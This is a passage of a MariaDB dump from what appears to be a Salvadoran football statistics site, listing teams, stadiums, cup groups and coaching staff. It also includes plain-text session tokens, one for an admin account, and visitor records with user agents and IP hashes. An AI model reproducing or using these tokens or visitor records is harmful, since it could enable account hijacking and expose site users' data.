/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19  Distrib 10.11.18-MariaDB, for debian-linux-gnu (aarch64)
--
-- Host: localhost    Database: numeros-y-futbol
-- ------------------------------------------------------
-- Server version	10.11.18-MariaDB-ubu2204

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `auth_tokens`
--

DROP TABLE IF EXISTS `auth_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_tokens` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `token` varchar(128) NOT NULL,
  `user_id` int(11) NOT NULL,
  `user_role` varchar(20) NOT NULL DEFAULT 'usuario',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `expires_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `token` (`token`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=135 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_tokens`
--

LOCK TABLES `auth_tokens` WRITE;
/*!40000 ALTER TABLE `auth_tokens` DISABLE KEYS */;
INSERT INTO `auth_tokens` VALUES
(45,'e42ebe1dca570ca1a6d2b2011189b2025523c3c040936a2b007b19f6a26c7788',21,'usuario','2026-07-28 17:54:33','2026-07-29 17:54:33'),
(134,'ed2e00f831cb87062574e177ad6d4464a473f6db99b64177045d17bdc71639de',9,'admin','2026-07-31 17:17:38','2026-08-01 17:17:38');
/*!40000 ALTER TABLE `auth_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `browser_visits`
--

DROP TABLE IF EXISTS `browser_visits`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `browser_visits` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `browser_token` char(36) NOT NULL,
  `user_agent` text DEFAULT NULL,
  `ip_hash` char(64) NOT NULL,
  `first_visit` timestamp NOT NULL DEFAULT current_timestamp(),
  `last_visit` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `visit_count` int(11) NOT NULL DEFAULT 1,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uq_browser_token` (`browser_token`),
  KEY `idx_ip_hash` (`ip_hash`),
  KEY `idx_last_visit` (`last_visit`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `browser_visits`
--

LOCK TABLES `browser_visits` WRITE;
/*!40000 ALTER TABLE `browser_visits` DISABLE KEYS */;
INSERT INTO `browser_visits` VALUES
(1,'87950662-a6e5-4b0e-8097-979d0cfb3a84','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','2026-07-17 15:44:22','2026-07-17 15:44:22',1),
(2,'2d0c9c1b-61ec-4408-8711-26c9363996ed','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','cd0eb517df151a008619c21943ff3175a049011efe2b5016d06a38fcf4a29dec','2026-07-17 17:40:34','2026-07-17 17:40:34',1),
(3,'5b6fa987-d7f2-453f-bd35-58d686efd2e4','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','4a481c19aecde856c6f3a1c299bcb2979b74b8cec0bc98081973c28563816992','2026-07-22 02:46:52','2026-07-22 02:46:52',1),
(4,'3b0dcdae-bd89-4830-9269-d384ac3efc09','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','2026-07-24 15:38:19','2026-07-31 17:16:00',15),
(5,'8fdfca03-4fa7-4eb6-a5dd-027060c8e8e1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','454d4e9fb15246c3e40ded4fbbaa019dd3ac07fb04e96d6c618f94e3593b7521','2026-07-24 15:42:01','2026-07-24 15:42:01',1),
(6,'0613c4b5-20e0-406e-ab11-0bfd1d3580c4','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','2026-07-28 03:59:27','2026-07-28 03:59:27',1),
(7,'590b0b64-bc95-423b-9792-4ced24508f87','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','2026-07-28 16:43:06','2026-07-30 18:56:36',3),
(8,'8a566bd1-6402-4d75-9f41-42ac0d98d1c3','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','2026-07-28 17:02:27','2026-07-28 17:02:27',1),
(9,'bf8df3ac-802e-49f8-8102-01c3226c8262','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','2026-07-28 17:22:07','2026-07-28 17:22:07',1),
(10,'7a7cf2a4-1d42-443d-ba85-e7c1aa9a604c','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','2026-07-29 18:38:42','2026-07-31 06:36:41',5),
(11,'66adaaff-7c44-438f-bc96-978ffd3ef635','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','2e1ade44dea83033951834f412a34da0817a8fc988f9b9f1df55c2a9d8267d13','2026-07-30 03:49:32','2026-07-31 15:58:35',3),
(12,'b1474f5e-d195-46cb-be0c-50ae9608597b','Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0','17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','2026-07-30 04:30:54','2026-07-30 04:30:54',1),
(13,'edc7321e-4d57-4f12-b876-c0b43d779662','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','2026-07-30 19:29:42','2026-07-30 19:29:42',1),
(14,'45c16862-31e0-459f-b039-f5b958f4dc74','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','2026-07-31 05:30:03','2026-07-31 05:30:03',1);
/*!40000 ALTER TABLE `browser_visits` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cuerpo_tecnico_seleccion`
--

DROP TABLE IF EXISTS `cuerpo_tecnico_seleccion`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `cuerpo_tecnico_seleccion` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `rol` varchar(100) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cuerpo_tecnico_seleccion`
--

LOCK TABLES `cuerpo_tecnico_seleccion` WRITE;
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion` DISABLE KEYS */;
INSERT INTO `cuerpo_tecnico_seleccion` VALUES
(1,'Hernán Darío \"Bolillo\" Gómez','Director Técnico','/backend/uploads/seleccion_1783695351_4a171df0.png','Colombia','2026-07-10 05:56:25'),
(2,'Héctor \"El Panzer\" Carvajal','Asistente Técnico','/backend/uploads/seleccion_1783695912_da2a66d4.png','Colombia','2026-07-10 05:58:10'),
(3,'Juan Mauricio Roldán','Preparador Físico','/backend/uploads/seleccion_1783695986_77ac5a2c.png','Colombia','2026-07-10 05:59:26'),
(4,'Asdrúbal \"El Gato\" Menéndez','Preparador Físico',NULL,'El Salvador','2026-07-10 06:00:50');
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cuerpo_tecnico_seleccion_femenina`
--

DROP TABLE IF EXISTS `cuerpo_tecnico_seleccion_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `cuerpo_tecnico_seleccion_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `rol` varchar(100) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cuerpo_tecnico_seleccion_femenina`
--

LOCK TABLES `cuerpo_tecnico_seleccion_femenina` WRITE;
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion_femenina` DISABLE KEYS */;
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cuerpo_tecnico_seleccion_sub17`
--

DROP TABLE IF EXISTS `cuerpo_tecnico_seleccion_sub17`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `cuerpo_tecnico_seleccion_sub17` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `rol` varchar(100) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cuerpo_tecnico_seleccion_sub17`
--

LOCK TABLES `cuerpo_tecnico_seleccion_sub17` WRITE;
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion_sub17` DISABLE KEYS */;
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion_sub17` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cuerpo_tecnico_seleccion_sub20`
--

DROP TABLE IF EXISTS `cuerpo_tecnico_seleccion_sub20`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `cuerpo_tecnico_seleccion_sub20` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `rol` varchar(100) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cuerpo_tecnico_seleccion_sub20`
--

LOCK TABLES `cuerpo_tecnico_seleccion_sub20` WRITE;
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion_sub20` DISABLE KEYS */;
/*!40000 ALTER TABLE `cuerpo_tecnico_seleccion_sub20` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos`
--

DROP TABLE IF EXISTS `equipos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `equipos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) DEFAULT NULL,
  `ciudad` varchar(100) DEFAULT NULL,
  `estadio` varchar(100) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `formacion` varchar(10) DEFAULT '4-4-2',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos`
--

LOCK TABLES `equipos` WRITE;
/*!40000 ALTER TABLE `equipos` DISABLE KEYS */;
INSERT INTO `equipos` VALUES
(4,'L.A. Firpo','Usulután','Estadio Sergio Torres Rivera','uploads/1775237339_LAFIRPO.png','3-4-3'),
(5,'Alianza F.C.','San Salvador',' Estadio Cuscatlán','uploads/1775237448_alianzafc.png','4-4-2'),
(6,'C.D. Águila','San Miguel','Estadio Juan Francisco Barraza','uploads/1775237638_Aguila.png','4-4-2'),
(7,'C.D. Municipal Limeño','Santa Rosa de Lima','Estadio Dr. Ramón Flores Berríos','uploads/escudos/equipo_7_1779945347.png','4-4-2'),
(8,'Inter Tecla','Santa Tecla','Estadio Nacional Las Delicias','uploads/escudos/equipo_8_1782942322.png','4-4-2'),
(9,'A.D. Isidro Metapán','Metapán','Estadio Jorge \"Calero\" Suárez','uploads/1775241152_metapan.png','4-4-2'),
(10,'C.D. Cacahuatique','Ciudad Barrios','Estadio Municipal de Chapeltique','uploads/1775242518_cacahuatique.png','4-4-2'),
(11,'C.D. Platense','Zacatecoluca','Antonio Toledo Valle','uploads/1775242938_platense.png','4-4-2'),
(12,'C.D. Fuerte San Francisco','San Francisco Gotera','Estadio Correcaminos','uploads/1775243154_morazan.png','4-4-2'),
(15,'C.D. FAS','Santa Ana','Estadio Óscar Alberto Quiteño','uploads/1775580005_FAS.png','4-4-2'),
(17,'CD ATL.BALBOA','La Unión','Marcelino Imbers','uploads/1784694388_balboa.png','4-4-2'),
(18,'CD Inca Aruba','Entre Ríos','Estadio Anna Mercedes Campos.','uploads/1784694507_incaaruba.png','4-4-2');
/*!40000 ALTER TABLE `equipos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos_ascenso`
--

DROP TABLE IF EXISTS `equipos_ascenso`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `equipos_ascenso` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) NOT NULL,
  `ciudad` varchar(100) DEFAULT NULL,
  `estadio` varchar(150) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `formacion` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=51 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos_ascenso`
--

LOCK TABLES `equipos_ascenso` WRITE;
/*!40000 ALTER TABLE `equipos_ascenso` DISABLE KEYS */;
INSERT INTO `equipos_ascenso` VALUES
(1,'C.D. Fuerte Aguilares','Aguilares, San Salvador','Complejo Deportivo Teofilo J. Simán','uploads/1775366328_fuerte aguilares.webp','2026-04-05 05:18:48','4-4-2'),
(3,'ADET-Aruba FC','Jayaque,  La Libertad','Estadio El Transito','uploads/1775366532_Aruba.webp','2026-04-05 05:22:12',NULL),
(9,'C.D. Dragón','San Miguel','Estadio Juan Fracisco Barraza','uploads/1775371713_dragon.png','2026-04-05 06:48:33',NULL),
(11,'C.D. Cruzeiro','San Cayetano Istepeque, San Vicente','Complejo Deportivo Tecoluca','uploads/1775381059_cruzeiro.png','2026-04-05 09:24:19',NULL),
(12,'C.D. Olimpico Litoral','Cerro de la Loma Larga','Complejo Deportivo Rafael López','uploads/1775381230_litoral.png','2026-04-05 09:27:10',NULL),
(14,'C.D. Neo Pipil','San Juan Nonualco','Estadio Neo Pipil','uploads/1775381481_neopipil.jpg','2026-04-05 09:31:21',NULL),
(19,'A.D. Izalco','Izalco, Sonsonate','Estadio Municipal Salvador Mariona','uploads/1778808698_IZALCOs.png','2026-07-06 05:11:00',NULL),
(20,'C.D. 11 Municipal','Ahuachapán','Estadio Arturo Simeón Magaña','uploads/1778808985_C.D. 11 Municipal.png','2026-07-06 05:11:00',NULL),
(22,'Marte Soyapango','Soyapango, San Salvador','Estadio Las Delicias','uploads/1783484543_martesouya.png','2026-07-06 05:11:00',NULL),
(23,'Academia BP','Nuevo Cuscatlán, La Libertad','Estadio Municipal Florencia','uploads/1778807456_academia bp2.png','2026-07-06 05:11:00',NULL),
(24,'A.D. Tenancingo','Cuscatlán','','uploads/1783347575_ad tenancinango.png','2026-07-06 05:11:00',NULL),
(26,'CSD Vendaval','Apopa, San Salvador','Cancha Joaquín Gutiérres','uploads/1778807010_vendaval 2.png','2026-07-06 05:11:00',NULL),
(30,'Audaz F.C.','Apastepeque, San Vicente','Estadio La Coyotera','uploads/1783563788_audaz.png','2026-07-06 05:11:00',NULL),
(33,'A.D. San Marcos','Jiquilisco, Usulután','Estadio Topiltzín','uploads/1783648047_cd sanmarc{.png','2026-07-06 05:11:00',NULL),
(34,'FORFUT','Cabañas','','uploads/1783646890_forfut.png','2026-07-06 05:11:00',NULL),
(35,'C.D. El Roble','Ilobasco, Cabañas','Estadio Municipal Mauricio Vides','uploads/1783645728_cd roble.png','2026-07-06 05:11:00',NULL),
(36,'CD El Vencedor','Santa Elena, Usulután','Cancha Municipal Huracán','uploads/1778810314_CD EL VENCEDOT.png','2026-07-06 05:11:00',NULL),
(37,'A.D. SESA','Guadalupe, San Vicente','Mini Estadio Vista al Volcán','uploads/1783648245_sesa.png','2026-07-06 05:11:00',NULL),
(38,'A.D. San Rafael','San Rafael Obrajuelo, La Paz','Estadio Jose Borjas Castillo','uploads/1783648175_san rafael.png','2026-07-06 05:11:00',NULL),
(39,'C.D. Sal Y Mar','San Alejo, La Unión','Estadio San Sebastian','uploads/1783647558_cd sal.png','2026-07-06 05:11:00',NULL),
(47,'11 LOBOS','Chalchuapa','','uploads/1784744810_11 lobos.png','2026-07-17 15:34:27',NULL),
(48,'C.D. PUMAS','San Salvador','Estadio Universitario Héroes y Mártires','uploads/1784784676_cd pumas.png','2026-07-17 15:40:21',NULL),
(49,'ORIÓN FC','Usulután','','uploads/1784744834_orion fc.png','2026-07-17 15:41:04',NULL),
(50,'Nacional FC','Sonsonate','Estadio Municipal Ana Mercedes Campos','uploads/1784899661_nacional fc.jpg','2026-07-17 15:41:33',NULL);
/*!40000 ALTER TABLE `equipos_ascenso` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos_burgerking`
--

DROP TABLE IF EXISTS `equipos_burgerking`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `equipos_burgerking` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) NOT NULL,
  `ciudad` varchar(100) DEFAULT NULL,
  `estadio` varchar(150) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `formacion` varchar(10) DEFAULT '4-4-2',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos_burgerking`
--

LOCK TABLES `equipos_burgerking` WRITE;
/*!40000 ALTER TABLE `equipos_burgerking` DISABLE KEYS */;
INSERT INTO `equipos_burgerking` VALUES
(25,'L.A. Firpo (U17)','Usulután','','uploads/escudos/burgerking_25_1784947453.png','4-4-2'),
(26,'Alianza F.C. (U17)','San Salvador','','uploads/escudos/burgerking_26_1784947461.png','4-4-2'),
(27,'C.D. Águila (U17)','San Miguel','','uploads/escudos/burgerking_27_1784947470.png','4-4-2'),
(28,'C.D. Municipal Limeño (U17)','Santa Rosa de Lima','','uploads/escudos/burgerking_28_1784947478.png','4-4-2'),
(29,'Inter Tecla (U17)','Santa Tecla','','uploads/escudos/burgerking_29_1784947499.png','4-4-2'),
(30,'A.D. Isidro Metapán (U17)','Metapán','','uploads/escudos/burgerking_30_1784947522.png','4-4-2'),
(31,'C.D. Cacahuatique (U17)','Ciudad Barrios','','uploads/escudos/burgerking_31_1784947547.png','4-4-2'),
(32,'C.D. Platense (U17)','Zacatecoluca','','uploads/escudos/burgerking_32_1784947644.png','4-4-2'),
(33,'C.D. Fuerte San Francisco (U17)','San Francisco Gotera','','uploads/escudos/burgerking_33_1784947654.png','4-4-2'),
(34,'C.D. FAS (U17)','Santa Ana','','uploads/escudos/burgerking_34_1784947661.png','4-4-2'),
(35,'CD ATL.BALBOA (U17)','La Unión','','uploads/escudos/burgerking_35_1784947680.png','4-4-2'),
(36,'CD Inca Aruba (U17)','Entre Ríos','','uploads/escudos/burgerking_36_1784947730.png','4-4-2');
/*!40000 ALTER TABLE `equipos_burgerking` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos_copa`
--

DROP TABLE IF EXISTS `equipos_copa`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `equipos_copa` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL COMMENT 'ID del equipo en su tabla original',
  `division` enum('Primera','Ascenso') NOT NULL,
  `nombre` varchar(100) NOT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `grupo` char(1) DEFAULT NULL COMMENT 'A-F, asignado por el admin',
  `activo` tinyint(1) DEFAULT 1,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uq_equipo_division` (`equipo_id`,`division`)
) ENGINE=InnoDB AUTO_INCREMENT=265 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos_copa`
--

LOCK TABLES `equipos_copa` WRITE;
/*!40000 ALTER TABLE `equipos_copa` DISABLE KEYS */;
INSERT INTO `equipos_copa` VALUES
(199,4,'Primera','L.A. Firpo','uploads/1775237339_LAFIRPO.png','C',1),
(200,5,'Primera','Alianza F.C.','uploads/1775237448_alianzafc.png','D',1),
(201,6,'Primera','C.D. Águila','uploads/1775237638_Aguila.png','B',1),
(202,7,'Primera','C.D. Municipal Limeño','uploads/escudos/equipo_7_1779945347.png','A',1),
(203,8,'Primera','Inter TECLA','uploads/escudos/equipo_8_1782942322.png','F',1),
(204,9,'Primera','A.D. Isidro Metapán','uploads/1775241152_metapan.png','F',1),
(205,10,'Primera','C.D. Cacahuatique','uploads/1775242518_cacahuatique.png','C',1),
(206,11,'Primera','C.D. Platense','uploads/1775242938_platense.png','A',1),
(207,12,'Primera','C.D. Fuerte','uploads/1775243154_morazan.png','B',1),
(210,15,'Primera','C.D. FAS','uploads/1775580005_FAS.png','E',1),
(211,1,'Ascenso','CD Fuerte Aguilares','uploads/1775366328_fuerte aguilares.webp','E',1),
(212,2,'Ascenso','C.D. Talleres Jr','uploads/1775366458_cd talleres.webp','F',1),
(213,3,'Ascenso','CD ADET-Aruba','uploads/1775366532_Aruba.webp',NULL,1),
(214,4,'Ascenso',' AD Batanecos','uploads/1775366637_Batanecos.png','D',1),
(215,5,'Ascenso','CD Inca','uploads/1775368426_C.D._Inca_Súper_Flat_logo.png',NULL,1),
(216,6,'Ascenso','A.D. Juventud Independiente','uploads/1783646402_juventu.png',NULL,1),
(217,7,'Ascenso','A.D. Espartano','uploads/1775369682_AD espartano.png',NULL,1),
(218,8,'Ascenso','Sensunte FC','uploads/1775370748_sensunte.webp','C',1),
(219,9,'Ascenso','C.D. Dragón','uploads/1775371713_dragon.png','B',1),
(220,10,'Ascenso','C.D. Atletico Balboa','uploads/1775381011_balboa.png',NULL,1),
(221,11,'Ascenso','C.D. Cruzeiro','uploads/1775381059_cruzeiro.png','A',1),
(222,12,'Ascenso','C.D. Olimpico Litoral','uploads/1775381230_litoral.png',NULL,1),
(223,13,'Ascenso','C.D. Pipil','uploads/1775381319_pipil.png',NULL,1),
(224,14,'Ascenso','C.D. Neo Pipil','uploads/1775381481_neopipil.jpg',NULL,1),
(225,15,'Ascenso','AD Municipal','uploads/1783431838_ad municipal.png',NULL,1),
(226,16,'Ascenso','CD Buenos Aires ','uploads/1783431010_cd buenos aires fc.png',NULL,1),
(227,17,'Ascenso','UD Santos ','uploads/1783473058_U.D santos.png',NULL,1),
(228,18,'Ascenso','Hachadura FC','uploads/1783430002_hachadura.png',NULL,1),
(229,19,'Ascenso','AD Izalco','uploads/1778808698_IZALCOs.png','E',1),
(230,20,'Ascenso','CD 11 Municipal','uploads/1778808985_C.D. 11 Municipal.png','F',1),
(231,21,'Ascenso','Juventud Candelareño','uploads/1783429929_Juventud candelareño.png',NULL,1),
(232,22,'Ascenso','Marte Soyapango','uploads/1783484543_martesouya.png',NULL,1),
(233,23,'Ascenso','Academia BP','uploads/1778807456_academia bp2.png',NULL,1),
(234,24,'Ascenso','Tenancingo','uploads/1783347575_ad tenancinango.png','A',1),
(235,25,'Ascenso','Nacional Las Margaritas','uploads/1783536475_ad nacional.png',NULL,1),
(236,26,'Ascenso','Vendaval','uploads/1778807010_vendaval 2.png','D',1),
(237,27,'Ascenso','Atlético Belén','uploads/1783483080_atlbelen.png',NULL,1),
(238,28,'Ascenso','Brasilia FC','uploads/1783481284_basilia.png',NULL,1),
(239,29,'Ascenso','Santo Tomás','uploads/1783536538_santotomas.png',NULL,1),
(240,30,'Ascenso','CD Audaz','uploads/1783563788_audaz.png',NULL,1),
(241,31,'Ascenso','Nonualco FC','uploads/1783647079_nHUlco.png',NULL,1),
(242,32,'Ascenso','Atlético Verapaz','uploads/1783646583_atverapaz.png',NULL,1),
(243,33,'Ascenso','San Marcos','uploads/1783648047_cd sanmarc{.png',NULL,1),
(244,34,'Ascenso','FORFUT','uploads/1783646890_forfut.png',NULL,1),
(245,35,'Ascenso','CD El Roble','uploads/1783645728_cd roble.png','C',1),
(246,36,'Ascenso','CD El Vencedor','uploads/1778810314_CD EL VENCEDOT.png',NULL,1),
(247,37,'Ascenso','SESSA','uploads/1783648245_sesa.png',NULL,1),
(248,38,'Ascenso','San Rafael Obrajuelo','uploads/1783648175_san rafael.png',NULL,1),
(249,39,'Ascenso','Sal Y Mar','uploads/1783647558_cd sal.png',NULL,1),
(250,40,'Ascenso','Brasil FC','uploads/1778809144_brasil fc.png',NULL,1),
(251,41,'Ascenso','Racing de Gualuca','uploads/1783647122_racing{.png','B',1),
(252,42,'Ascenso','Real Sociedad','uploads/1783647422_rel socu.png',NULL,1),
(253,43,'Ascenso','Estrellas del Sur','uploads/1778806361_CD ESTRELLAS DEL SUR.png',NULL,1),
(254,44,'Ascenso','CD Buenos Aires','uploads/1778807163_buenos aires 2.png',NULL,1),
(255,45,'Ascenso','Atlético San Simón','uploads/1783646198_sansimon.png',NULL,1),
(256,46,'Ascenso','Vista Hermosa','uploads/1783648353_vista.png',NULL,1),
(261,17,'Primera','CD ATL.BALBOA','uploads/1784694388_balboa.png',NULL,1),
(262,18,'Primera','CD Inca Aruba','uploads/1784694507_incaaruba.png',NULL,1);
/*!40000 ALTER TABLE `equipos_copa` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos_primera_femenina`
--

DROP TABLE IF EXISTS `equipos_primera_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
